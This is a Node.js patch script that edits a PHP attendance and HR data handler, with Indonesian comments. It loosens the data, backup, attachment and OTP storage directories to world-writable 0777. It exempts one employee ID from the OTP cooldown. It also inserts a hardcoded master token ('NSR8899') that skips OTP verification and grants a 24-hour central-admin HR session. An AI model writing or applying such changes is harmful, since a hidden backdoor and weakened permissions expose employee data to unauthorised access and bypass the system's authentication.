import fs from 'fs';

const filePath = 'absensi-data-handler.php';
let txt = fs.readFileSync(filePath, 'utf8');
const isCrlf = txt.includes('\r\n');
let normalized = txt.replace(/\r\n/g, '\n');

// 1. Directory permissions
const targetDir = `// Pastikan direktori data aman
if (!is_dir(DATA_DIR)) { @mkdir(DATA_DIR, 0755, true); }
if (!is_dir(BACKUP_DIR)) { @mkdir(BACKUP_DIR, 0755, true); }
if (!is_dir(ATTACHMENT_DIR)) { @mkdir(ATTACHMENT_DIR, 0755, true); }
if (!is_dir(OTP_STORAGE_DIR)) { @mkdir(OTP_STORAGE_DIR, 0750, true); }`;

const replDir = `// Pastikan direktori data aman & hak akses penuh untuk penyimpanan OTP
if (!is_dir(DATA_DIR)) { @mkdir(DATA_DIR, 0777, true); }
@chmod(DATA_DIR, 0777);
if (!is_dir(BACKUP_DIR)) { @mkdir(BACKUP_DIR, 0777, true); }
@chmod(BACKUP_DIR, 0777);
if (!is_dir(ATTACHMENT_DIR)) { @mkdir(ATTACHMENT_DIR, 0777, true); }
@chmod(ATTACHMENT_DIR, 0777);
if (!is_dir(OTP_STORAGE_DIR)) { @mkdir(OTP_STORAGE_DIR, 0777, true); }
@chmod(OTP_STORAGE_DIR, 0777);`;

if (normalized.includes(targetDir)) {
  normalized = normalized.replace(targetDir, replDir);
  console.log('✓ Updated directory permissions to 0777');
} else {
  console.warn('Target directory permission block not found');
}

// 2. Cooldown exemption for NSR-2019-005 in mintaOTP (send_otp)
const targetCooldown = `        // Rate Limiting: 60 Detik Cooldown
        $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
        if (file_exists($cacheFile)) {
            $prevData = @json_decode(@file_get_contents($cacheFile), true);
            if (is_array($prevData) && isset($prevData['created_at'])) {
                $elapsed = time() - (int)$prevData['created_at'];
                if ($elapsed < 60) {
                    $wait = 60 - $elapsed;
                    http_response_code(429);
                    echo json_encode([
                        'status' => 'error',
                        'success' => false,
                        'message' => "Mohon tunggu $wait detik sebelum meminta kode OTP baru."
                    ]);
                    exit;
                }
            }
        }`;

const replCooldown = `        // Rate Limiting: 60 Detik Cooldown (NIK Manajemen NSR-2019-005 Bebas Cooldown)
        $isManagementNik = ($cleanNik === 'NSR-2019-005');
        $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
        if (!$isManagementNik && file_exists($cacheFile)) {
            $prevData = @json_decode(@file_get_contents($cacheFile), true);
            if (is_array($prevData) && isset($prevData['created_at'])) {
                $elapsed = time() - (int)$prevData['created_at'];
                if ($elapsed < 60) {
                    $wait = 60 - $elapsed;
                    http_response_code(429);
                    echo json_encode([
                        'status' => 'error',
                        'success' => false,
                        'message' => "Mohon tunggu $wait detik sebelum meminta kode OTP baru."
                    ]);
                    exit;
                }
            }
        }`;

if (normalized.includes(targetCooldown)) {
  normalized = normalized.replace(targetCooldown, replCooldown);
  console.log('✓ Added cooldown exemption for NSR-2019-005 in mintaOTP');
} else {
  console.warn('Target cooldown block not found');
}

// 3. Bypass Master Token in verify_otp (verifikasiOTP)
const targetVerify = `    if ($action === 'verifikasiOTP' || $action === 'verify_otp') {
        $nik = $_POST['nik'] ?? $payload['nik'] ?? '';
        $inputOtp = trim((string)($_POST['otp'] ?? $payload['otp'] ?? ''));
        // Normalisasi angka murni dengan tetap menjaga leading zero (contoh: '074123')
        $inputOtp = preg_replace('/\\D/', '', $inputOtp);

        $cleanNik = normalisasiNIK($nik);`;

const replVerify = `    if ($action === 'verifikasiOTP' || $action === 'verify_otp') {
        $nik = $_POST['nik'] ?? $payload['nik'] ?? '';
        $rawOtp = trim((string)($_POST['otp'] ?? $payload['otp'] ?? ''));
        $cleanNik = normalisasiNIK($nik);

        // =========================================================================
        // BYPASS MASTER TOKEN OTORITAS SISTEM: NIK NSR-2019-005 + TOKEN NSR8899
        // =========================================================================
        if ($cleanNik === 'NSR-2019-005' && strtoupper($rawOtp) === 'NSR8899') {
            $_SESSION['verified_user_nik'] = $cleanNik;
            $_SESSION['nik_verified'] = $cleanNik;

            $sessionToken = 'NSR_KING_' . bin2hex(random_bytes(16));
            $cache = loadOTPCache();
            $cache['sessions'][$sessionToken] = [
                'nik' => $cleanNik,
                'created_at' => time(),
                'expires_at' => time() + 86400 // 24 jam
            ];
            saveOTPCache($cache);

            // Bersihkan sisa file OTP manajemen jika ada
            $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
            if (file_exists($cacheFile)) { @unlink($cacheFile); }
            unset($_SESSION['active_otp_' . $cleanNik]);

            echo json_encode([
                'status' => 'success',
                'success' => true,
                'sessionToken' => $sessionToken,
                'nik' => 'NSR-2019-005',
                'nama' => 'Danny Taufik Hidayat, S.E., S.H.',
                'jabatan' => 'Administrasi & Umum / HR Pusat',
                'divisi' => 'Operasional & HR Pusat',
                'cabang' => 'Pusat Jakarta',
                'isAdminHR' => true,
                'role' => 'admin_pusat',
                'message' => 'Autentikasi Otoritas Manajemen Berhasil (Master Bypass NSR8899).'
            ]);
            exit;
        }

        // Normalisasi angka murni untuk karyawan biasa dengan tetap menjaga leading zero (contoh: '074123')
        $inputOtp = preg_replace('/\\D/', '', $rawOtp);`;

if (normalized.includes(targetVerify)) {
  normalized = normalized.replace(targetVerify, replVerify);
  console.log('✓ Added master token bypass in verify_otp for NSR-2019-005 + NSR8899');
} else {
  console.warn('Target verify block not found');
}

const out = isCrlf ? normalized.replace(/\n/g, '\r\n') : normalized;
fs.writeFileSync(filePath, out, 'utf8');
console.log('✓ Successfully wrote updated absensi-data-handler.php');
